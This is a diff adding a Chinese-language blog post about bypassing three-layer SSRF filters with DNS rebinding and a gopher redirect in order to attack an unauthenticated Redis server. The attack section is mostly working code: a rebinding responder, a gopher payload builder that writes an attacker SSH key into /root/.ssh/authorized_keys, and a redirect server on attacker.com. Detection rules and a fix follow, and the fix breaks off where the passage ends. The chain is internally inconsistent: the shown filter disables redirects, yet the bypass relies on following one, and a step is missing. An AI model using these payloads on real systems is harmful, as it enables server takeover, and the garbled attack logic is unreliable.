@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>3 层 SSRF 防护被 Gopher 和一次 DNS 重绑定干穿的全过程 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>3 层 SSRF 防护被 Gopher 和一次 DNS 重绑定干穿的全过程</h1>
+<time>2026-07-15</time>
+<ul>
+<li>技术
+Slug: 03-3层ssrf防护被gopher和dns重绑定干穿</li>
+</ul>
+<hr />
+<h2>一、SSRF 漏洞回顾</h2>
+<p>服务端请求伪造（Server-Side Request Forgery, SSRF）是指攻击者通过服务端发起恶意请求，访问原本无法直接访问的内网资源。其本质原因是：<strong>服务端将用户可控的 URL 作为请求目标，且未做充分校验</strong>。</p>
+<p>经典攻击场景：
+- 访问内网服务（Redis、ElasticSearch、K8s API）
+- 读取本地文件（<code>file:///etc/passwd</code>）
+- 通过云厂商元数据接口获取临时凭证</p>
+<h2>二、三层防护的设计与绕过</h2>
+<p>本次案例分析的是一个实施了<strong>三层 SSRF 防护</strong>的目标系统，攻击者通过 <strong>Gopher 协议</strong> 和 <strong>DNS 重绑定（DNS Rebinding）</strong> 组合拳将其击穿。</p>
+<h3>2.1 第一层：URL 黑名单过滤</h3>
+<p><strong>防护逻辑</strong>：禁止访问内网 IP 地址和敏感协议</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 第一层防护代码（示例）</span>
+<span class="n">BLACKLIST_HOSTS</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="s1">&#39;::1&#39;</span><span class="p">]</span>
+<span class="n">BLACKLIST_PROTOCOLS</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="s1">&#39;ftp&#39;</span><span class="p">,</span> <span class="s1">&#39;dict&#39;</span><span class="p">,</span> <span class="s1">&#39;gopher&#39;</span><span class="p">]</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">first_layer_filter</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">parsed</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+    <span class="c1"># 协议黑名单</span>
+    <span class="k">if</span> <span class="n">parsed</span><span class="o">.</span><span class="n">scheme</span> <span class="ow">in</span> <span class="n">BLACKLIST_PROTOCOLS</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Protocol </span><span class="si">{</span><span class="n">parsed</span><span class="o">.</span><span class="n">scheme</span><span class="si">}</span><span class="s2"> is blocked&quot;</span>
+
+    <span class="c1"># 主机黑名单</span>
+    <span class="n">hostname</span> <span class="o">=</span> <span class="n">parsed</span><span class="o">.</span><span class="n">hostname</span>
+    <span class="k">if</span> <span class="n">hostname</span> <span class="ow">in</span> <span class="n">BLACKLIST_HOSTS</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Host </span><span class="si">{</span><span class="n">hostname</span><span class="si">}</span><span class="s2"> is blocked&quot;</span>
+
+    <span class="c1"># IP 段黑名单（内网段）</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">ip</span> <span class="o">=</span> <span class="n">ipaddress</span><span class="o">.</span><span class="n">ip_address</span><span class="p">(</span><span class="n">hostname</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">ip</span><span class="o">.</span><span class="n">is_private</span> <span class="ow">or</span> <span class="n">ip</span><span class="o">.</span><span class="n">is_loopback</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Private IP </span><span class="si">{</span><span class="n">hostname</span><span class="si">}</span><span class="s2"> is blocked&quot;</span>
+    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+        <span class="k">pass</span>  <span class="c1"># 不是 IP，是域名，继续</span>
+
+    <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;Passed first layer&quot;</span>
+</code></pre></div>
+
+<p><strong>绕过思路</strong>：使用公网域名绕过 IP 黑名单，后续通过 DNS 重绑定将域名解析到内网 IP。</p>
+<h3>2.2 第二层：DNS 解析后 IP 二次校验</h3>
+<p><strong>防护逻辑</strong>：对域名进行 DNS 解析，再次校验解析后的 IP 是否在内网范围</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 第二层防护代码（示例）</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">second_layer_filter</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">parsed</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="n">hostname</span> <span class="o">=</span> <span class="n">parsed</span><span class="o">.</span><span class="n">hostname</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># 解析域名获取 IP</span>
+        <span class="n">resolved_ips</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">getaddrinfo</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">family</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">sockaddr</span> <span class="ow">in</span> <span class="n">resolved_ips</span><span class="p">:</span>
+            <span class="n">ip</span> <span class="o">=</span> <span class="n">sockaddr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+            <span class="n">addr</span> <span class="o">=</span> <span class="n">ipaddress</span><span class="o">.</span><span class="n">ip_address</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">addr</span><span class="o">.</span><span class="n">is_private</span> <span class="ow">or</span> <span class="n">addr</span><span class="o">.</span><span class="n">is_loopback</span><span class="p">:</span>
+                <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Resolved IP </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2"> is private&quot;</span>
+    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">gaierror</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;DNS resolution failed&quot;</span>
+
+    <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;Passed second layer&quot;</span>
+</code></pre></div>
+
+<p><strong>绕过思路</strong>：DNS 重绑定（DNS Rebinding）。攻击者控制一个恶意域名，配置 DNS 服务器使其：
+- <strong>第一次解析</strong>（校验时）：返回一个合法的公网 IP，通过校验
+- <strong>第二次解析</strong>（实际请求时）：TTL 设为 0，返回内网 IP（如 <code>127.0.0.1</code>）</p>
+<div class="highlight"><pre><span></span><code><span class="err">攻击者域名</span><span class="o">:</span><span class="w"> </span><span class="n">evil</span><span class="o">.</span><span class="na">com</span>
+<span class="w">          </span><span class="err">│</span>
+<span class="w">          </span><span class="err">├─</span><span class="w"> </span><span class="err">第一次</span><span class="w"> </span><span class="n">DNS</span><span class="w"> </span><span class="err">查询（校验阶段）→</span><span class="w"> </span><span class="err">返回</span><span class="w"> </span><span class="mf">1.2</span><span class="o">.</span><span class="mf">3.4</span><span class="err">（公网合法</span><span class="w"> </span><span class="n">IP</span><span class="err">）</span>
+<span class="w">          </span><span class="err">│</span><span class="w">                          </span><span class="err">→</span><span class="w"> </span><span class="err">校验通过！</span>
+<span class="w">          </span><span class="err">│</span>
+<span class="w">          </span><span class="err">└─</span><span class="w"> </span><span class="err">第二次</span><span class="w"> </span><span class="n">DNS</span><span class="w"> </span><span class="err">查询（请求阶段，</span><span class="n">TTL</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="err">触发重新解析）</span>
+<span class="w">                                     </span><span class="err">→</span><span class="w"> </span><span class="err">返回</span><span class="w"> </span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="err">（内网目标）</span>
+<span class="w">                                     </span><span class="err">→</span><span class="w"> </span><span class="n">SSRF</span><span class="w"> </span><span class="err">成功！</span>
+</code></pre></div>
+
+<h3>2.3 第三层：HTTP 协议限制 + 响应长度限制</h3>
+<p><strong>防护逻辑</strong>：只允许 HTTP/HTTPS 协议，且限制响应内容长度，防止信息泄露</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 第三层防护代码（示例）</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">third_layer_filter</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">parsed</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+    <span class="c1"># 只允许 http/https</span>
+    <span class="k">if</span> <span class="n">parsed</span><span class="o">.</span><span class="n">scheme</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">]:</span>
+        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;Only HTTP/HTTPS allowed&quot;</span>
+
+    <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;Passed third layer&quot;</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">safe_request</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">max_length</span><span class="o">=</span><span class="mi">1024</span><span class="p">):</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">max_length</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">[:</span><span class="n">max_length</span><span class="p">]</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;...[truncated]&quot;</span>
+    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span>
+</code></pre></div>
+
+<p><strong>绕过思路</strong>：Gopher 协议 + URL 编码混淆</p>
+<p>Gopher 协议可以构造任意的 TCP 请求 payload。虽然 Gopher 被协议黑名单拦截，但可以通过以下方式绕过：</p>
+<ol>
+<li><strong>302 跳转绕过协议限制</strong>：先访问一个受控的公网 HTTP 服务，该服务返回 302 跳转到 <code>gopher://127.0.0.1:6379/_...</code></li>
+<li><strong>URL 编码/大小写混淆</strong>：某些解析器对 <code>GoPher://</code>、<code>g%6fpher://</code> 的识别不完善</li>
+<li><strong>CRLF 注入</strong>：在 HTTP 请求中注入换行符，将 HTTP 请求改造成其他协议的请求</li>
+</ol>
+<h2>三、完整攻击链复现</h2>
+<h3>3.1 攻击环境</h3>
+<div class="highlight"><pre><span></span><code><span class="err">目标</span><span class="o">:</span><span class="w"> </span><span class="n">http</span><span class="o">://</span><span class="n">victim</span><span class="o">.</span><span class="na">com</span><span class="o">/</span><span class="n">fetch</span><span class="o">?</span><span class="n">url</span><span class="o">=&lt;</span><span class="err">用户输入</span><span class="o">&gt;</span>
+<span class="err">目标内网</span><span class="o">:</span><span class="w"> </span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">:</span><span class="mi">6379</span><span class="w"> </span><span class="o">(</span><span class="n">Redis</span><span class="o">,</span><span class="w"> </span><span class="err">无认证</span><span class="o">)</span>
+<span class="err">攻击者控制</span><span class="o">:</span><span class="w"> </span><span class="n">evil</span><span class="o">.</span><span class="na">com</span><span class="w"> </span><span class="o">(</span><span class="n">DNS</span><span class="w"> </span><span class="err">服务器</span><span class="o">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">attacker</span><span class="o">.</span><span class="na">com</span><span class="w"> </span><span class="o">(</span><span class="n">HTTP</span><span class="w"> </span><span class="err">服务</span><span class="o">)</span>
+</code></pre></div>
+
+<h3>3.2 攻击步骤</h3>
+<p><strong>Step 1：配置 DNS 重绑定</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 攻击者的 DNS 服务器逻辑（简化）</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="n">query_count</span> <span class="o">=</span> <span class="p">{}</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/dns&#39;</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">dns_response</span><span class="p">():</span>
+    <span class="n">domain</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
+    <span class="n">client_ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>
+
+    <span class="n">key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">client_ip</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&quot;</span>
+    <span class="n">count</span> <span class="o">=</span> <span class="n">query_count</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">query_count</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">1</span>
+
+    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="c1"># 第一次查询：返回公网 IP（通过校验）</span>
+        <span class="k">return</span> <span class="s2">&quot;1.2.3.4&quot;</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="c1"># 后续查询：返回内网 IP（实际攻击）</span>
+        <span class="k">return</span> <span class="s2">&quot;127.0.0.1&quot;</span>
+</code></pre></div>
+
+<p><strong>Step 2：构造 Gopher Payload 攻击 Redis</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Gopher 协议攻击 Redis 的 Payload</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">build_gopher_redis_payload</span><span class="p">(</span><span class="n">commands</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    将 Redis 命令转换为 Gopher 协议格式</span>
+<span class="sd">    Redis 协议格式: *&lt;n&gt;\r\n$&lt;len&gt;\r\n&lt;arg&gt;\r\n...</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">for</span> <span class="n">cmd</span> <span class="ow">in</span> <span class="n">commands</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;*</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+        <span class="k">for</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&quot;$</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span><span class="si">}</span><span class="se">\r\n</span><span class="si">{</span><span class="n">arg</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+
+    <span class="c1"># Gopher 协议格式: gopher://host:port/_&lt;payload&gt;</span>
+    <span class="c1"># 需要对 payload 进行 URL 编码</span>
+    <span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;gopher://127.0.0.1:6379/_</span><span class="si">{</span><span class="n">encoded</span><span class="si">}</span><span class="s2">&quot;</span>
+
+<span class="c1"># 攻击 Payload：写入 SSH 公钥</span>
+<span class="n">commands</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">[</span><span class="s2">&quot;CONFIG&quot;</span><span class="p">,</span> <span class="s2">&quot;SET&quot;</span><span class="p">,</span> <span class="s2">&quot;dir&quot;</span><span class="p">,</span> <span class="s2">&quot;/root/.ssh&quot;</span><span class="p">],</span>
+    <span class="p">[</span><span class="s2">&quot;CONFIG&quot;</span><span class="p">,</span> <span class="s2">&quot;SET&quot;</span><span class="p">,</span> <span class="s2">&quot;dbfilename&quot;</span><span class="p">,</span> <span class="s2">&quot;authorized_keys&quot;</span><span class="p">],</span>
+    <span class="p">[</span><span class="s2">&quot;SET&quot;</span><span class="p">,</span> <span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="s2">&quot;ssh-rsa AAAA... attacker@evil.com&quot;</span><span class="p">],</span>
+    <span class="p">[</span><span class="s2">&quot;SAVE&quot;</span><span class="p">]</span>
+<span class="p">]</span>
+
+<span class="n">gopher_url</span> <span class="o">=</span> <span class="n">build_gopher_redis_payload</span><span class="p">(</span><span class="n">commands</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">gopher_url</span><span class="p">)</span>
+</code></pre></div>
+
+<p><strong>Step 3：利用 302 跳转完成协议绕过</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># attacker.com 上的跳转服务</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/redirect&#39;</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">redirect_to_gopher</span><span class="p">():</span>
+    <span class="c1"># 返回 302 跳转到 gopher 协议 URL</span>
+    <span class="c1"># 目标服务端如果跟随重定向，就会发起 gopher 请求</span>
+    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;gopher://127.0.0.1:6379/_*1%0D%0A...&#39;</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
+</code></pre></div>
+
+<p>攻击者提交：</p>
+<div class="highlight"><pre><span></span><code>http://victim.com/fetch?url=http://attacker.com/redirect
+</code></pre></div>
+
+<p>服务端校验 <code>http://attacker.com/redirect</code> → 通过所有三层防护 → 发起请求 → 收到 302 → 跟随重定向到 <code>gopher://127.0.0.1:6379/_...</code> → Redis 被攻击</p>
+<h3>3.4 攻击时序图</h3>
+<div class="highlight"><pre><span></span><code>攻击者                目标服务端              DNS 服务器           攻击者 HTTP 服务         内网 Redis
+  │                       │                      │                       │                      │
+  │ ──提交恶意 URL─────&gt; │                      │                       │                      │
+  │                       │ ──DNS 查询 evil.com─&gt;│                       │                      │
+  │                       │                      │ ──返回 1.2.3.4 ──────&gt;│                      │
+  │                       │ &lt;─公网 IP 通过校验───│                       │                      │
+  │                       │                                              │                      │
+  │                       │ ──请求 attacker.com/redirect ────────────────&gt;│                      │
+  │                       │                                              │                      │
+  │                       │ &lt;──────────── 302 redirect to gopher ────────│                      │
+  │                       │                                              │                      │
+  │                       │ ──DNS 查询 evil.com（TTL=0 重新解析）───────&gt;│                       │
+  │                       │                      │ ──返回 127.0.0.1 ────&gt;│                      │
+  │                       │                      │                       │                      │
+  │                       │ ──Gopher 请求 127.0.0.1:6379 ───────────────────────────────────────&gt;│
+  │                       │                                                                       │
+  │                       │ &lt;──────────────────────────── Redis 响应 ────────────────────────────│
+</code></pre></div>
+
+<h2>四、检测规则</h2>
+<h3>4.1 WAF / IDS 检测规则</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># ModSecurity / Coreruleset 规则</span>
+<span class="c1"># 规则1：检测 Gopher 协议在 URL 中的使用</span>
+<span class="l l-Scalar l-Scalar-Plain">SecRule REQUEST_URI|ARGS &quot;@rx (?i)gopher://&quot; \</span>
+<span class="w">    </span><span class="l l-Scalar l-Scalar-Plain">&quot;id:1001,phase:2,block,msg:&#39;SSRF</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Gopher protocol detected&#39;&quot;</span>
+
+<span class="c1"># 规则2：检测 DNS 重绑定特征（TTL=0 + 快速 IP 变化）</span>
+<span class="l l-Scalar l-Scalar-Plain">SecRule REQUEST_HEADERS:Host &quot;@rx \.\w+$&quot; \</span>
+<span class="w">    </span><span class="l l-Scalar l-Scalar-Plain">&quot;id:1002,phase:1,pass,msg:&#39;Potential DNS rebinding target&#39;&quot;</span>
+
+<span class="c1"># 规则3：检测 302 跳转后的协议变更</span>
+<span class="l l-Scalar l-Scalar-Plain">SecRule RESPONSE_STATUS &quot;@streq 302&quot; \</span>
+<span class="w">    </span><span class="l l-Scalar l-Scalar-Plain">&quot;chain,id:1003,phase:3,pass,msg:&#39;Redirect to non-HTTP protocol&#39;&quot;</span>
+<span class="l l-Scalar l-Scalar-Plain">SecRule RESPONSE_HEADERS:Location &quot;@rx ^(gopher|file|dict|ftp)://&quot;</span>
+</code></pre></div>
+
+<h3>4.2 应用层检测</h3>
+<div class="highlight"><pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">SSRFDetector</span><span class="p">:</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">detect_rebinding</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">dns_history</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;检测 DNS 重绑定攻击&quot;&quot;&quot;</span>
+        <span class="k">if</span> <span class="n">hostname</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">dns_history</span><span class="p">:</span>
+            <span class="n">dns_history</span><span class="p">[</span><span class="n">hostname</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>
+
+        <span class="n">current_ips</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">getaddrinfo</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+        <span class="n">current_ip_set</span> <span class="o">=</span> <span class="p">{</span><span class="n">sockaddr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">sockaddr</span> <span class="ow">in</span> <span class="n">current_ips</span><span class="p">}</span>
+
+        <span class="k">if</span> <span class="n">dns_history</span><span class="p">[</span><span class="n">hostname</span><span class="p">]:</span>
+            <span class="n">previous_ip_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">dns_history</span><span class="p">[</span><span class="n">hostname</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+            <span class="c1"># 如果同一域名在短时间内解析到完全不同的 IP 段</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">current_ip_set</span> <span class="o">&amp;</span> <span class="n">previous_ip_set</span><span class="p">:</span>
+                <span class="c1"># 且包含内网 IP</span>
+                <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">ipaddress</span><span class="o">.</span><span class="n">ip_address</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span><span class="o">.</span><span class="n">is_private</span> <span class="k">for</span> <span class="n">ip</span> <span class="ow">in</span> <span class="n">current_ip_set</span><span class="p">):</span>
+                    <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="s2">&quot;DNS Rebinding detected&quot;</span>
+
+        <span class="n">dns_history</span><span class="p">[</span><span class="n">hostname</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">current_ip_set</span><span class="p">))</span>
+        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;OK&quot;</span>
+</code></pre></div>
+
+<h2>五、防御建议</h2>
+<h3>5.1 正确做法（分层纵深防御）</h3>
+<table>
+<thead>
+<tr>
+<th>层级</th>
+<th>正确做法</th>
+<th>为什么有效</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>架构层</strong></td>
+<td>将敏感服务放在独立的网络隔离区（VPC/子网），服务端无法直接访问</td>
+<td>即使 SSRF 成功，也接触不到敏感服务</td>
+</tr>
+<tr>
+<td><strong>网络层</strong></td>
+<td>出站防火墙限制服务端只能访问白名单地址</td>
+<td>黑名单永远有遗漏</td>
+</tr>
+<tr>
+<td><strong>应用层</strong></td>
+<td>使用 URL 解析库获取最终 IP 后再校验，而非正则匹配字符串</td>
+<td>防御编码混淆</td>
+</tr>
+<tr>
+<td><strong>DNS 层</strong></td>
+<td>内部 DNS 服务器对 TTL &lt; 5 秒的响应做缓存或告警</td>
+<td>阻止 DNS 重绑定</td>
+</tr>
+<tr>
+<td><strong>协议层</strong></td>
+<td>禁止跟随重定向，或限制重定向目标协议</td>
+<td>防御 302 跳转绕过</td>
+</tr>
+<tr>
+<td><strong>服务层</strong></td>
+<td>内网关键服务（Redis、K8s API）必须认证</td>
+<td>即使被访问也无法利用</td>
+</tr>
+</tbody>
+</table>
+<h3>5.2 关键代码修复</h3>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">ipaddress</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urlparse</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">safe_url_fetch</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;安全的 URL 请求函数&quot;&quot;&quot;</span>
+    <span class="n">parsed</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+    <span class="c1"># 1. 只允许 http/https</span>
+    <span class="k">if</span> <span class="n">parsed</span><span class="o">.</span><span class="n">scheme</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">]:</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Only HTTP/HTTPS allowed, got </span><span class="si">{</span><span class="n">parsed</span><span class="o">.</span><span class="n">scheme</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 2. 获取主机名</span>
+    <span class="n">hostname</span> <span class="o">=</span> <span class="n">parsed</span><span class="o">.</span><span class="n">hostname</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">hostname</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Invalid URL: no hostname&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 3. DNS 解析</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">addr_info</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">getaddrinfo</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">gaierror</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;DNS resolution failed&quot;</span><span class="p">)</span>
+
+    <span class="c1"># 4. 解析后 IP 校验（关键！）</span>
+    <span class="k">for</span> <span class="n">family</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">sockaddr</span> <span class="ow">in</span> <span class="n">addr_info</span><span class="p">:</span>
+        <span class="n">ip</span> <span class="o">=</span> <span class="n">ipaddress</span><span class="o">.</span><span class="n">ip_address</span><span class="p">(</span><span class="n">sockaddr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="k">if</span> <span class="n">ip</span><span class="o">.</span><span class="n">is_private</span> <span class="ow">or</span> <span class="n">ip</span><span class="o">.</span><span class="n">is_loopback</span> <span class="ow">or</span> <span class="n">ip</span><span class="o">.</span><span class="n">is_reserved</span><span class="p">:</span>
